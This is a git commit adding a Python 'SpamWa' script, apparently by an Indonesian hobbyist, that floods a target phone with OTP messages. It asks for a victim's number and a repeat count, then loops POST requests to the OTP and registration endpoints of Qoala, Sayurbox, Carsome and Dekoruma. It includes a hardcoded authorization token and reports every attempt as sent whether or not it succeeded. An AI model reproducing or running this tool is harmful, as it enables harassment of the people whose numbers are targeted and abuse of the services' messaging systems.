653da03ea5af153db3ee48ed33408de123c6a10f
Riski-X <121473970+Riski-X@users.noreply.github.com>
2023-02-25 15:46:30 +0700

    Add files via upload

---
+++ SpamWa1.py
@@ -0,0 +1,100 @@
+# KARNAH UDAH GRATIS SUBCRIBE SCHANEL RISKI-X YAH TOD
+import requests, json, sys, os, random, time
+
+def mengetik(z):
+    for e in z + "\n":
+      sys.stdout.write(e)
+      sys.stdout.flush()
+      time.sleep(0.01)
+
+#untuk memper cantik sc nya
+
+Hijau="\033[1;92m"
+putih="\033[1;97m"
+abu="\033[1;90m"
+kuning="\033[1;93m"
+ungu="\033[1;95m"
+merah="\33[37;1m"
+biru="\033[1;96m"
+#Tulisan Background Merah
+bg="\033[1;0m\033[1;41mText\033[1;0m"
+
+os.system('clear')
+time.sleep(3)
+print ("\033[36;1mSUBCRIBE YOTUBEKU \033[37SSUBSCRIBE DULU RISKI-X \033[36;1mKASIH JUGA FOLLOW DI GITHUB:v")
+time.sleep(2)
+os.system("xdg-open https://youtube.com/RISKI-X")
+os.system('clear')
+time.sleep(2)
+#ubh terserah subscribe Riski
+mengetik(f"""
+ __  __
+|  \/  |  KEGUNAAN : SPAM WA
+| |\/| |  VERSION  : V.01
+| |  | |  UNTUK APA BANYAK LOGO KALAU GAK MASUK SPAM NYA
+|_|  |_|  100% SPAM AKAN MASUK
+
+
+\033[1;95mNOTE : INI KU EXPRIT KARNA 100% WORK NANTI DI PERJUAL BELIKAN
+
+\033[33;1m╔════════════════════════════════════════════════╗
+\033[33;1m║  \033[36;1m [•] Authour : RISKI-X                     \033[33;1m   ║
+\033[33;1m║  \033[36;1m [•] gitHub  : https:github.com/RISKI-X   \033[33;1m    ║
+\033[33;1m║  \033[36;1m [•] Yotube  : RISKI-X                     \033[33;1m   ║
+\033[33;1m╚════════════════════════════════════════════════╝
+
+\033[36;1m╔═══════════════════════════╗
+\033[36;1m║   \033[33;1m GUNAKAN DENGAN BIJAK  \033[36;1m ║
+\033[36;1m╚═══════════════════════════╝
+""")
+
+k = 0
+mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m   NOMOR TARGET\033[1;33m• \033[0m\033[1;30m]══════════════>")
+print("\033[1;96mNOMOR TARGET DI AWALI ANGKA 8 DAN NOMOR NYA JANGAN BUAT 08 LAGI")
+mengetik("\033[37m[\033[31m•\033[37m]\033[32m ContoH\033[37m : \033[37m\033[33m877XXXXXXXX\033[33m")
+nomer=input(f"\n\033[37m[\033[31m•\033[37m]\033[32m Nomor Target\033[32m \033[37m:\033[37m\033[33m ")
+mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m MASUKAN JUMLAH \033[1;33m• \033[0m\033[1;30m]═════════════>")
+jumlah=int(input(f"\033[37m[\033[31m•\033[37m]\033[32m Jumlah Spam\033[37m :\033[37m\033[33m "))
+print("")
+print("")
+# jgn di ubh
+headers_qoala = {'Host': 'api.qoalaplus.com','content-length': '48','accept': 'application/json, text/plain, */*','user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36','content-type': 'application/json','origin': 'https://www.qoalaplus.com','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.qoalaplus.com/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+headers_sayur = {'Host': 'www.sayurbox.com','content-length': '289','authorization': 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjY3NTM3OTE3LCJleHAiOjE2NzAxMjk5MTcsImlhdCI6MTY2NzUzNzkxNywiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6Ijc1ZTBlYzhjLWJkNDEtNGFjNy04OWFmLTdiMjkyOWRmYWIzNyIsInN1YiI6IjJFd2xtbjM1dHZ0ejdQZ1NQU05nSndkdEdSenoiLCJ1c2VyX2lkIjoiMkV3bG1uMzV0dnR6N1BnU1BTTmdKd2R0R1J6eiJ9.FeTawVAcqeWQSRoC6eki_jqwykO-uKuSSWzcEKC8dGJYfbXdwzTbK6gPvloXuI16RzH-jvtIiMghKwP4S6-M0JHwLI8feMA5UGIPQsnUiOR9LpqqV-2kybWvVNsU1DrsdHRbTyVZBFdwwwGVlqMGBM25gH30GAzDI7Hp6g-MvCwPH9KTC4xvD5vQkdJHFa9q42sxWDVz9TkzJ09fCgPX4ZdEONJ3c_63BvLwzVLb24t7ivjhcMJBkWvHNsZ5FsSxXyUB8sCGEA7ify4q2iV2cfnRklcTx2r20MFLOGsPBK0uGFUsbXdctJXC-WtM3jddwmDt0fX1CfToA0x4PL3Hhw','content-type': 'application/json','accept': '*/*','user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36','x-bundle-revision': '14.2','x-sbox-tenant': 'sayurbox','x-binary-version': '2.4.1','origin': 'https://www.sayurbox.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+headers_carsome = {'Host': 'www.carsome.id','content-length': '38','accept': 'application/json, text/plain, */*','x-language': 'id','x-token': '','country': 'ID','x-amplitude-device-id': 'QbOr1g4RMMMIpnkg7JVqx7','user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36','content-type': 'application/json','origin': 'https://www.carsome.id','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.carsome.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+headers_dek = {"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+# jgn di ubah
+data_qoala = json.dumps({"phone_number":"+62"+nomer,"channel":"WA"})
+data_sayur = json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomer},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
+data_carsome = json.dumps({"username":nomer,"optType":1})
+data_dek = json.dumps({"phoneNumber":"+62"+nomer,"platform":"sms"})
+# jgn di ubh tod
+for k in range(jumlah):
+  k += 1
+  pos_qoala = requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers=headers_qoala,data=data_qoala).text
+  if "success" in pos_qoala:
+    print("\033[1;95m[∆] Spam WhatsApp Qoala TERKIRIM",k)
+  else:
+    print("\033[1;95m[∆] Spam WhatsApp Qoala TERKIRIM",k)
+for k in range(jumlah):
+  k += 1
+  pos_sayur = requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers=headers_sayur,data=data_sayur).text
+  if "__typename" in pos_sayur:
+    print("\033[1;95m[∆] Spam WhatsApp SayurBox TERKIRIM",k)
+  else:
+    print("\033[1;95m[∆] Spam WhatsApp SayurBox TERKIRIM",k)
+for k in range(jumlah):
+  k += 1
+  pos_carsome = requests.post("https://www.carsome.id/website/login/sendSMS",headers=headers_carsome,data=data_carsome).text
+  if "Send successfully" in pos_carsome:
+    print("\033[1;95m[∆] Spam WhatsApp Carsome FeTawVAcqeWQSRoC6eki_jqwykO-uKuSSWzcEKC8dGJYfbXdwzTbK6gPvloXuI16RzH-jvtIiMghKwP4S6-M0JHwLI8feMA5UGIPQsnUiOR9LpqqV-2kybWvVNsU1DrsdHRbTyVZBFdwwwGVlqMGBM25gH30GAzDI7Hp6g-MvCwPH9KTC4xvD5vQkdJHFa9q42sxWDVz9TkzJ09fCgPX4ZdEONJ3c_63BvLwzVLb24t7ivjhcMJBkWvHNsZ5FsSxXyUB8sCGEA7ify4q2iV2cfnRklcTx2r20MFLOGsPBK0uGFUsbXdctJXC-WtM3jddwmDt0fX1CfToA0x4PL3Hhw",k)
+  else:
+    print("\033[1;95m[∆] Spam WhatsApp Carsome TERKIRIM",k)
+for k in range(jumlah):
+  k += 1
+  dek = requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers=headers_dek,data=data_dek).text
+  if "mengirim" in dek:
+    print("\033[1;95m[∆] Spam sms dekorama TERKIRIM",k)
+  else:
+    print("\033[1;95m[∆] Spam sms dekorama TERKIRIM",k)
+
+#y agak mls ngodingnya tpi y perbagus sendiri sono
